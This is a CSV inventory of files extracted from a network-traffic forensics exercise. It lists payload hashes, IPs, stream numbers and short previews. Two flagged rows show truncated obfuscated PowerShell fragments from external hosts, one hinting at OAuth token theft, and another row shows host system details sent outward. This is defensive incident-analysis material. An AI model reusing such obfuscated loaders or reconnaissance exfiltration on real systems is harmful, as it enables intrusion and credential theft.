case,file_path,file_name,size_bytes,sha256,content_type,content_preview,frame_number,tcp_stream,src_ip_in_filename,dst_ip_in_filename,suspicious_flag
case3,case3/payloads/http_file_data/frame_47001_stream_171_10.6.13.133_to_104.16.231.132.bin,frame_47001_stream_171_10.6.13.133_to_104.16.231.132.bin,30527,eb109aba4ef5d687fb7557cb3a6722fe69ff3224341ab521deca9754fdfa9934,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.ïŋ―.ïŋ―gfFdDfïŋ―dïŋ―..Qïŋ―""[H""{oïŋ―ïŋ―#ïŋ―^!{ïŋ―.""ïŋ―=ïŋ―Wvïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―yïŋ―?}ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―9ïŋ―9ïŋ―",47001,171,10.6.13.133,104.16.231.132.,no
case3,case3/payloads/http_file_data/frame_47096_stream_173_10.6.13.133_to_104.21.80.1.bin,frame_47096_stream_173_10.6.13.133_to_104.21.80.1.bin,30528,325a7198b01f5845e4753e567690a619731a700113d952e768246ad00f8fde2d,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.ïŋ―ïŋ―ïŋ―""[.!ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―;ïŋ―ïŋ―WFv..Ųlïŋ―ïŋ―ïŋ―^Ųē)Yïŋ―3D2ïŋ―..o?ïŋ―ïŋ―ïŋ―}?ïŋ―<ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―=ïŋ―:ïŋ―\ïŋ―",47096,173,10.6.13.133,104.21.80.1.,no
case3,case3/payloads/http_file_data/frame_47206_stream_176_10.6.13.133_to_104.16.231.132.bin,frame_47206_stream_176_10.6.13.133_to_104.16.231.132.bin,30535,a0102d2dfdf9f604c5dce7020abea132ee600ff736e28a6f8a806057ec75b32a,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.ïŋ―ïŋ―gHfïŋ―ïŋ―""ïŋ―2ïŋ―ïŋ―ïŋ―ïŋ―.!doQïŋ―ïŋ―.ïŋ―ïŋ―T.ïŋ―Gïŋ―ïŋ―Lïŋ―ïŋ―{ïŋ―)o?9ïŋ―8ïŋ―yïŋ―ïŋ―ïŋ―ïŋ―Ïïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―}ïŋ―ïŋ―}]ïŋ―",47206,176,10.6.13.133,104.16.231.132.,no
case3,case3/payloads/http_file_data/frame_47266_stream_177_10.6.13.133_to_104.21.80.1.bin,frame_47266_stream_177_10.6.13.133_to_104.21.80.1.bin,30524,2baf1dd69b1fdd7210a5b7ccf7054fe5e56f298c6bc30902076de8c5fc6543b4,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.ïŋ―ïŋ―#ïŋ―PfYïŋ―""dïŋ―ïŋ―Mvïŋ―ïŋ―ïŋ―,#{eïŋ―.B(ïŋ―ïŋ―ïŋ―ïŋ―.Bvïŋ―ïŋ―^!3ïŋ―ïŋ―'ïŋ―.ïŋ―<ïŋ―<ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―=ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―",47266,177,10.6.13.133,104.21.80.1.,no
case3,case3/payloads/http_file_data/frame_47323_stream_178_10.6.13.133_to_104.16.231.132.bin,frame_47323_stream_178_10.6.13.133_to_104.16.231.132.bin,30523,09d079fe4cd5ccba7a4d7459530ccde14f461ddc28ab76be76419f375df3bf59,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.6ïŋ―ïŋ―ïŋ―7ïŋ―-3#B!$##ïŋ―ïŋ―^E.ïŋ―+{..ïŋ―ïŋ―Ųïŋ―dïŋ―.Evïŋ―(ïŋ―ïŋ―'ïŋ―.ïŋ―<ïŋ―<ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―=ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―",47323,178,10.6.13.133,104.16.231.132.,no
case3,case3/payloads/http_file_data/frame_47372_stream_179_10.6.13.133_to_104.21.64.1.bin,frame_47372_stream_179_10.6.13.133_to_104.21.64.1.bin,30529,0e6dc7698b5b85d58ecf1db6de9d2d26adae080c504822f56e08ad7352e6e3e9,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.ïŋ―.ïŋ―7e.ID.ïŋ―2Cïŋ―ïŋ―{fïŋ―Mvïŋ―ïŋ―ïŋ―.!#ïŋ―ïŋ―lŲ.ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―=ïŋ―~rïŋ―qïŋ―ïŋ―ïŋ―ïŋ―yïŋ―?Ïïŋ―ïŋ―ïŋ―}ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―",47372,179,10.6.13.133,104.21.64.1.,no
case3,case3/payloads/http_file_data/frame_47423_stream_180_10.6.13.133_to_104.21.64.1.bin,frame_47423_stream_180_10.6.13.133_to_104.21.64.1.bin,30521,3f38460563073ec78e94be62085bedc89abdd664f2e8c69b627d45a7f799dcae,application/octet-stream,".ïŋ―.......
ïŋ―}eXïŋ―ïŋ―.-
.Ōïŋ―HI( (HH7Hïŋ―.ŌĨ4ïŋ―Jw(( ïŋ―(%ïŋ―ïŋ―ïŋ―ïŋ―t)]ïŋ―Ýïŋ―qïŋ―ïŋ―ïŋ―aïŋ―ïŋ―+rïŋ―{~ïŋ―ïŋ―wïŋ―ïŋ―ïŋ―{ïŋ―ïŋ―ïŋ―Z",47423,180,10.6.13.133,104.21.64.1.,no
case3,case3/payloads/http_file_data/frame_47482_stream_181_10.6.13.133_to_104.21.80.1.bin,frame_47482_stream_181_10.6.13.133_to_104.21.80.1.bin,30506,0540c813dbc04d7eb0f0a8c45002f6e537ec251a159ee526e2c8bb02f1c0d415,application/octet-stream,".ïŋ―.......
ïŋ―ïŋ―w<ïŋ―ïŋ―ïŋ―>.ïŋ―eïŋ―ïŋ―.ïŋ―ïŋ―ïŋ―.ïŋ―7ïŋ―ïŋ―Bfeïŋ―R.Ųē3ïŋ―ïŋ―3dïŋ―..ïŋ―ïŋ―.ïŋ―.ïŋ―ïŋ―ïŋ―%ïŋ―.ïŋ―.ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―yzïŋ―ïŋ―ïŋ―}ïŋ―ïŋ―}]",47482,181,10.6.13.133,104.21.80.1.,no
case3,case3/payloads/http_file_data/frame_47545_stream_182_10.6.13.133_to_104.16.231.132.bin,frame_47545_stream_182_10.6.13.133_to_104.16.231.132.bin,30490,aaba18b0dec70025ecd16a947c4a775a655faf6792fba2f1adbf6d8eaceee18f,application/octet-stream,".ïŋ―.......
ïŋ―}w8ïŋ―ïŋ―Ûū.2.ïŋ―.ïŋ―ïŋ―.!{.ïŋ―w.ïŋ―.ïŋ―ïŋ―.!ïŋ―ïŋ―2ïŋ―3ïŋ―ïŋ―ïŋ―M.ïŋ―+ïŋ―.?.yïŋ―ïŋ―ïŋ―ïŋ―/|ïŋ―ïŋ―ïŋ―ïŋ―#Gïŋ―qïŋ―?ïŋ―uïŋ―ïŋ―uïŋ―",47545,182,10.6.13.133,104.16.231.132.,no
case3,case3/payloads/http_file_data/frame_47603_stream_183_10.6.13.133_to_104.21.80.1.bin,frame_47603_stream_183_10.6.13.133_to_104.21.80.1.bin,30536,1bb9c3c6fb445e218779b679c76752e91795c44cab14ff001e37d9de27676ace,application/octet-stream,".ïŋ―.......
ïŋ―}eXïŋ―ïŋ―.ïŋ―4ïŋ―tIH#ïŋ―J)].""H#!%."".Jïŋ―ïŋ―ïŋ―t#.""%ïŋ―Rïŋ―ïŋ―ïŋ―ïŋ―tw(ïŋ―ïŋ―t\?dfïŋ―9ïŋ―ïŋ―ïŋ―įïŋ―ïŋ―ïŋ―{ïŋ―^{ïŋ―",47603,183,10.6.13.133,104.21.80.1.,no
case3,case3/payloads/http_file_data/frame_47652_stream_184_10.6.13.133_to_104.21.80.1.bin,frame_47652_stream_184_10.6.13.133_to_104.21.80.1.bin,30496,9fce2d5d2c076560fe0bdb09c64b90b0ee860b18214c6da1082a4fa8815c5ddf,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.6ïŋ―Č2ïŋ―ïŋ―.!{edïŋ―ïŋ―M.ïŋ―ïŋ―Eïŋ―ÞĄ.!ïŋ―ïŋ―-ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―.Bfïŋ―~rß·ïŋ―~ïŋ―7<ïŋ―ïŋ―ïŋ―ïŋ―.ïŋ―ïŋ―ïŋ―ïŋ―=ïŋ―:ïŋ―\ïŋ―u",47652,184,10.6.13.133,104.21.80.1.,no
case3,case3/payloads/http_file_data/frame_47710_stream_185_10.6.13.133_to_104.16.231.132.bin,frame_47710_stream_185_10.6.13.133_to_104.16.231.132.bin,30524,18bef6d684def5209ff2fbab46c793192a9aa85611ed5aab5a38d009f864915c,application/octet-stream,".ïŋ―.......
ïŋ―}eXïŋ―ïŋ―.-Ýïŋ―ïŋ―( .
ïŋ―ïŋ―!%(!Jïŋ―ïŋ―ïŋ―ïŋ―tKïŋ―t(ïŋ― %) ""!ïŋ―Jïŋ―t	...ïŋ―ïŋ―Cfïŋ―ïŋ―sïŋ―ïŋ―yïŋ―ïŋ―9?ïŋ―yïŋ―wïŋ―ïŋ―^k",47710,185,10.6.13.133,104.16.231.132.,no
case3,case3/payloads/http_file_data/frame_47767_stream_186_10.6.13.133_to_104.21.80.1.bin,frame_47767_stream_186_10.6.13.133_to_104.21.80.1.bin,30530,fabc83de2abc842a38a0fedd5d742c3f3179c9a609e401b3719e52821f132570,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.ïŋ―ïŋ―MvIDDF({.ïŋ―=ïŋ―eDïŋ―dïŋ―ïŋ―=Bïŋ―ïŋ―.ïŋ―ïŋ―""{..Efïŋ―zïŋ―ïŋ―9ïŋ―9ïŋ―ïŋ―&ïŋ―ïŋ―}ïŋ―<.~ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―",47767,186,10.6.13.133,104.21.80.1.,no
case3,case3/payloads/http_file_data/frame_47823_stream_187_10.6.13.133_to_104.21.80.1.bin,frame_47823_stream_187_10.6.13.133_to_104.21.80.1.bin,30527,4f46087652991ec1233367ad02f852c5897ee7456ca16b82454377df0fedccc5,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.ïŋ―ïŋ―.!ïŋ―ïŋ―]vBvïŋ―.ïŋ―3ïŋ―ïŋ―dïŋ―dïŋ―Q.ïŋ―.eïŋ―.ïŋ―WFïŋ―ïŋ―ïŋ―Č=ïŋ―ïŋ―ïŋ―'ïŋ―.ïŋ―<ïŋ―<ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―=ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―",47823,187,10.6.13.133,104.21.80.1.,no
case3,case3/payloads/http_file_data/frame_47875_stream_188_10.6.13.133_to_104.16.230.132.bin,frame_47875_stream_188_10.6.13.133_to_104.16.230.132.bin,30529,0041c17767c79ec17c2672ecc2ec316172c90e04546a9a90f297ad83fc0a6125,application/octet-stream,".ïŋ―.......
ïŋ―}eXïŋ―ïŋ―.-Jw	.ïŋ―ïŋ―ïŋ―ïŋ―
ïŋ―ïŋ―4ïŋ―ïŋ―ïŋ―..ïŋ―ïŋ―%ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―""%ïŋ―ïŋ―tïŋ―t)ïŋ―t#"" ïŋ―ïŋ―Cfïŋ―ïŋ―sïŋ―ïŋ―yïŋ―ïŋ―9?ïŋ―yïŋ―wïŋ―ïŋ―^k",47875,188,10.6.13.133,104.16.230.132.,no
case3,case3/payloads/http_file_data/frame_47938_stream_189_10.6.13.133_to_104.21.80.1.bin,frame_47938_stream_189_10.6.13.133_to_104.21.80.1.bin,30517,7888997c8f73c0de793a68e416e30d56eea6f7746b2d7e83d08ccc45a4bbadd7,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.6!{ïŋ―""{%+#dgfgDïŋ―(ïŋ―ïŋ―.ïŋ―[ddïŋ―ïŋ―ïŋ―Bïŋ―ė―ģïŋ―ïŋ―{S.Yo?9ïŋ―8ïŋ―yïŋ―ïŋ―ïŋ―ïŋ―Ïïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―}ïŋ―ïŋ―}]",47938,189,10.6.13.133,104.21.80.1.,no
case3,case3/payloads/http_file_data/frame_47985_stream_190_10.6.13.133_to_104.21.112.1.bin,frame_47985_stream_190_10.6.13.133_to_104.21.112.1.bin,30520,138e5e166edefef373be789df14bd9c3eed2c9343902c17a316c4095e2f4fde4,application/octet-stream,".ïŋ―.......
ïŋ―}eXïŋ―ïŋ―.ïŋ―tïŋ―ïŋ―.ïŋ― -ïŋ―ïŋ―ïŋ― ïŋ―  !ïŋ―"")-ïŋ― -!]..J(ïŋ―)JKïŋ―tïŋ―ïŋ― ïŋ―tïŋ―ïŋ―Cfïŋ―ïŋ―sïŋ―ïŋ―yïŋ―ïŋ―9?ïŋ―yïŋ―wïŋ―ïŋ―^k",47985,190,10.6.13.133,104.21.112.1.,no
case3,case3/payloads/http_file_data/frame_48044_stream_191_10.6.13.133_to_104.21.112.1.bin,frame_48044_stream_191_10.6.13.133_to_104.21.112.1.bin,30532,c5a0d8b4704c13513b67a1edf959164121ba493c58a9a937abec0ccb8358b2b4,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.ïŋ―ïŋ―ïŋ―Wïŋ―ïŋ―7!Bvïŋ―ïŋ―=ïŋ―.ïŋ―M..Ųïŋ―.ïŋ―ïŋ―Yvïŋ―&Bïŋ―ïŋ―ïŋ―ïŋ―&ïŋ―ïŋ―'ïŋ―.ïŋ―<ïŋ―<ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―=ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―",48044,191,10.6.13.133,104.21.112.1.,no
case3,case3/payloads/http_file_data/frame_48098_stream_192_10.6.13.133_to_104.16.230.132.bin,frame_48098_stream_192_10.6.13.133_to_104.16.230.132.bin,30534,650631f8bd89c65ce5a16cd3ff09fb603659ff790d5c1f6bd77426b78a5df198,application/octet-stream,".ïŋ―.......
ïŋ―}eXïŋ―ïŋ―.ïŋ―  ïŋ―ïŋ―ïŋ― .*!Rïŋ―(]ïŋ―ïŋ―Ýïŋ―H
ïŋ―!ïŋ―.R""""ïŋ―tI#!-)ïŋ―""Hïŋ―ïŋ―Cfïŋ―ïŋ―sïŋ―ïŋ―yïŋ―ïŋ―9?ïŋ―yïŋ―wïŋ―ïŋ―^k",48098,192,10.6.13.133,104.16.230.132.,no
case3,case3/payloads/http_file_data/frame_48291_stream_200_10.6.13.133_to_104.16.230.132.bin,frame_48291_stream_200_10.6.13.133_to_104.16.230.132.bin,30528,75bec75a3ba62b7f91fce61bb4e47461bb5c79ddfe0d87c79e9ea536c11616ff,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.ïŋ―ïŋ―Iïŋ―.Eïŋ―ïŋ―3Bv!BFïŋ―&3ïŋ―Pïŋ―ïŋ―!#ïŋ―CffVïŋ―ïŋ―.eS6ïŋ―!ïŋ―ïŋ―ïŋ―ïŋ―sïŋ―ïŋ―oïŋ―|ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―|.ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―",48291,200,10.6.13.133,104.16.230.132.,no
case3,case3/payloads/http_file_data/frame_48369_stream_202_10.6.13.133_to_104.21.112.1.bin,frame_48369_stream_202_10.6.13.133_to_104.21.112.1.bin,30527,1f9ccbeecb82d8689eed81500a8804b2ccc435458212a4d18efc1d69c6d03c14,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.6!ïŋ―ïŋ―.ïŋ―d.Yïŋ―{${%#[FFïŋ―ČYïŋ―ïŋ―=3""{E!dïŋ―ïŋ―-#+{ïŋ―ïŋ―Oïŋ―9ïŋ―yïŋ―7y>ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―{ïŋ―ïŋ―ïŋ―}_ïŋ―}_",48369,202,10.6.13.133,104.21.112.1.,no
case3,case3/payloads/http_file_data/frame_48430_stream_203_10.6.13.133_to_104.16.230.132.bin,frame_48430_stream_203_10.6.13.133_to_104.16.230.132.bin,30522,e0fe1fbd2e2bd11116b193a74bf8889e3963fbd5b534ec72d090186f869408a7,application/octet-stream,".ïŋ―.......
ïŋ―}w8ïŋ―a.ïŋ―ïŋ―ïŋ―gïŋ―ïŋ―(ïŋ―ïŋ―&{ïŋ―ïŋ―2ïŋ―#dDïŋ―
ïŋ―#[(.""DVïŋ―ïŋ―ïŋ―=""{dïŋ―ïŋ―.ïŋ―ïŋ―ïŋ―ïŋ―<ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―=ïŋ―ïŋ―ïŋ―..ïŋ―ïŋ―vïŋ―ïŋ―ïŋ―:ïŋ―ïŋ―",48430,203,10.6.13.133,104.16.230.132.,no
case3,case3/payloads/http_file_data/frame_48500_stream_204_10.6.13.133_to_104.16.230.132.bin,frame_48500_stream_204_10.6.13.133_to_104.16.230.132.bin,30524,b43859e9d538530ecb6b8e6517b0e648ae788d7ac699b3235a266f289a7384e0,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.6Qïŋ―ïŋ―ïŋ―Hïŋ―""ïŋ―ïŋ―Éïŋ―ïŋ―ïŋ―ïŋ―2"";#BFfR""Bïŋ―ïŋ―Ųēeoïŋ―[ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―sïŋ―ïŋ―oïŋ―|ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―|.ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―",48500,204,10.6.13.133,104.16.230.132.,no
case3,case3/payloads/http_file_data/frame_48557_stream_205_10.6.13.133_to_104.21.112.1.bin,frame_48557_stream_205_10.6.13.133_to_104.21.112.1.bin,30518,e55352c0c43ba43b6f9812ef7573c124d8196ee5cb32e207bb8637d27d717b94,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.6ïŋ―ïŋ―##ïŋ―ïŋ―ïŋ―Čïŋ―-!3ïŋ―ïŋ―.Ųdïŋ―Q.Qïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―^Eïŋ―ïŋ―2Cvïŋ―ïŋ―ïŋ―sïŋ―sïŋ―ïŋ―Mïŋ―ïŋ―ïŋ―ïŋ―yïŋ―ïŋ―ïŋ―ïŋ―ïŋ―{ïŋ―ïŋ―}ïŋ―ïŋ―u",48557,205,10.6.13.133,104.21.112.1.,no
case3,case3/payloads/http_file_data/frame_48608_stream_206_10.6.13.133_to_104.21.112.1.bin,frame_48608_stream_206_10.6.13.133_to_104.21.112.1.bin,30534,580381b8c19c950b361f86b6362bc60a74225ea9bea99d5b7652ccecae1d235c,application/octet-stream,".ïŋ―.......
ïŋ―}eXïŋ―ïŋ―.-
J
.R*!..ïŋ― ïŋ―tïŋ―ïŋ―tK#ïŋ―Ý4ïŋ―!ïŋ―ïŋ― ]""ïŋ―ïŋ―.ïŋ―ïŋ―ïŋ―ÝŌïŋ―.ïŋ―.fÎ―""ïŋ―ïŋ―ïŋ―ïŋ―|ïŋ―ïŋ―.ïŋ―ïŋ―{ïŋ―ïŋ―",48608,206,10.6.13.133,104.21.112.1.,no
case3,case3/payloads/http_file_data/frame_48661_stream_207_10.6.13.133_to_104.16.231.132.bin,frame_48661_stream_207_10.6.13.133_to_104.16.231.132.bin,30515,bdc565b8b928809b8b6f0e7c7e53d6baba992c5ea0b472c7e70f8dbf6e1f2d9b,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.ïŋ―ïŋ―GvvdefG!ddïŋ―.!ïŋ―ïŋ―.ïŋ―({ïŋ―ïŋ―=2ïŋ―W({.!{Ïïŋ―.!Dïŋ―ïŋ―Oïŋ―ïŋ―vïŋ―ïŋ―ïŋ―&ïŋ―ïŋ―}ïŋ―ïŋ―.ïŋ―ïŋ―ïŋ―ïŋ―{ïŋ―uÎđ",48661,207,10.6.13.133,104.16.231.132.,no
case3,case3/payloads/http_file_data/frame_48794_stream_212_10.6.13.133_to_104.21.96.1.bin,frame_48794_stream_212_10.6.13.133_to_104.21.96.1.bin,30526,c2e21dee81b70298462191dfc307c5536d5382af55fc8b8e12ba1145399201de,application/octet-stream,".ïŋ―.......
ïŋ―}eXïŋ―ïŋ―.-.ïŋ―!.ïŋ―ïŋ―ïŋ―ïŋ―t(ïŋ―].ïŋ―ïŋ―%HH..Jïŋ―ïŋ― ïŋ―ïŋ―ïŋ―(!!J.ïŋ―ïŋ―%)ïŋ―ïŋ―!-\?dfïŋ―9ïŋ―ïŋ―ïŋ―įïŋ―ïŋ―ïŋ―{ïŋ―^{ïŋ―",48794,212,10.6.13.133,104.21.96.1.,no
case3,case3/payloads/http_file_data/frame_48855_stream_213_10.6.13.133_to_104.21.112.1.bin,frame_48855_stream_213_10.6.13.133_to_104.21.112.1.bin,30528,724ffbd37471042977062da86a0c0beb63d7bb9247f8257b892fa85e8c3dd79c,application/octet-stream,".ïŋ―.......
ïŋ―}w<ïŋ―q.vdo.ïŋ―.edf.ïŋ―2C6){egïŋ―Hf(3+ïŋ―.ïŋ―Gïŋ―ïŋ―ïŋ―ïŋ―(Bïŋ―ïŋ―ïŋ―'ïŋ―.ïŋ―<ïŋ―<ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―=ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―ïŋ―",48855,213,10.6.13.133,104.21.112.1.,no
case3,case3/payloads/http_file_data/frame_5979_stream_83_10.6.13.133_to_10.6.13.129.bin,frame_5979_stream_83_10.6.13.133_to_10.6.13.129.bin,733,f97de6033c33002e71dbea51c9a31b839220cec8633f78ba325a39ffa89e2e54,application/octet-stream,"<?xml version=""1.0"" encoding=""utf-8""?><soap:Envelope xmlns:soap=""http://www.w3.o",5979,83,10.6.13.133,10.6.13.129.,no
case3,case3/payloads/http_file_data/frame_5982_stream_83_10.6.13.129_to_10.6.13.133.bin,frame_5982_stream_83_10.6.13.129_to_10.6.13.133.bin,2208,8505f74ca504fc12862e6c6e1d61dddcdb0279957b2fe3b84479a0dea4f3b698,application/octet-stream,"<?xml version=""1.0"" encoding=""utf-8""?><soap:Envelope xmlns:soap=""http://www.w3.o",5982,83,10.6.13.129,10.6.13.133.,no
case3,case3/payloads/http_file_data/frame_6654_stream_89_104.21.24.186_to_10.6.13.133.bin,frame_6654_stream_89_104.21.24.186_to_10.6.13.133.bin,5485,1332433fbcea805d83cb8f00c4b1e5063d264389403b3e37ebce18d41c17e7ec,application/octet-stream,"${Get-Hotfix -InputFormat -LogName System && ($ttegb)} = ""JE82YjdIQnU4ZzQwQ2VmZl",6654,89,104.21.24.186,10.6.13.133.,yes
case3,case3/payloads/http_file_data/frame_6699_stream_90_10.6.13.133_to_104.21.112.1.bin,frame_6699_stream_90_10.6.13.133_to_104.21.112.1.bin,2798,4a12788f1aa53b51cc12e989a261de38a443a5c9e1b18eb317ac58879eabe7dd,application/octet-stream,"
Host Name:                     DESKTOP-5AVE44C
OS Name:                      ",6699,90,10.6.13.133,104.21.112.1.,no
case3,case3/payloads/http_file_data/frame_8561_stream_90_104.21.112.1_to_10.6.13.133.bin,frame_8561_stream_90_104.21.112.1_to_10.6.13.133.bin,991303,9e2f538ca158d67ab3572080cf575ab21c0373ba05d19ce8794fcb3665fb7acf,application/octet-stream,"${Get-Hotfix -InputFormat -Uri oauth2.googleapis.com/token && ($lipp)} = ""JGZ6TV",8561,90,104.21.112.1,10.6.13.133.,yes
case3,case3/visualization/geo_data.csv,geo_data.csv,4135,2e4605df382d55a2e52634b47cd195506856a78650cd86e12dca46f18d18c49f,text/plain,"ip,country,countryCode,city,lat,lon,org,is_c2
104.16.124.96,Canada,CA,Toronto,4",0,0,,,no
case3,case3/visualization/tls_ja3.csv,tls_ja3.csv,12131,46ef8980462dd5599a562dc4e7acff1c13394a8c29aa89a7881b8ed5a495f764,text/plain,"frame_no,timestamp,src_ip,dst_ip,tls_version,tls_version_int,cipher_suites_count",0,0,,,no
case3,case3/visualization/tls_ja3_summary.json,tls_ja3_summary.json,2359,c3e8d2b24be1c5a12ce6e0415d1eff0676293e20eacd34ea2756b2b5c3860ef7,unknown,"{
  ""case"": ""case3"",
  ""pcap"": ""pcap/2025-06-13-traffic-analysis-exercise.pcap"",",0,0,,,no
case3,case3/zeek_like/conn_summary.csv,conn_summary.csv,16515,b9e72749a8ab7ad59806c8970cde0d7167e5175f28a26ba2d978eed9345403fe,text/plain,"src_ip,dst_ip,src_port,dst_port,protocol
10.6.13.133,10.6.13.3,52427,389,TCP
10.",0,0,,,no
case3,case3/zeek_like/dns_summary.csv,dns_summary.csv,29519,6b5b42aaeb865add832b25efe188a7dccd3d18113551f4a74c9d57f76f764358,text/plain,"timestamp,src_ip,dst_ip,query
2025-06-13 22:33:55.712627,10.6.13.133,10.6.13.3,w",0,0,,,no
case3,case3/zeek_like/http_summary.csv,http_summary.csv,10664,5499e7b50dcb7ed3bab0ae8d6b61a4d920e7aba7045cb3ba69743f5a89fd0d21,text/plain,"timestamp,src_ip,dst_ip,method,host,uri,user_agent
2025-06-13 22:34:00.479901,10",0,0,,,no
case3,case3/zeek_like/suspicious_http.csv,suspicious_http.csv,51,5bc5e6bfbbec5b37b2e90663a34347f90216cac16ee6a48ab3f3478180c29e91,text/plain,"timestamp,src_ip,dst_ip,method,host,uri,user_agent
",0,0,,,no
